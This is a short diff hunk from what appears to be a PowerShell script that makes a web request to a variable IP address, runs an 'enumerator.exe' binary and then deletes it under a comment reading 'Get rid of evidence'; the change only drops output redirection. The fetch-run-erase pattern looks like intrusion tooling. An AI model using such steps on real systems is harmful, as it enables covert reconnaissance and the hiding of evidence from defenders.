@@ -29,7 +29,7 @@ $HTTP_REQUEST = Invoke-WebRequest -Uri $IP_ADDR -Method Get -Headers $GET_HEADER
 
 # Run ls_read.exe
 # DEBUG: Redirect output into output.txt
-./enumerator.exe > output.txt
+./enumerator.exe
 
 # Get rid of evidence
 rm ./enumerator.exe
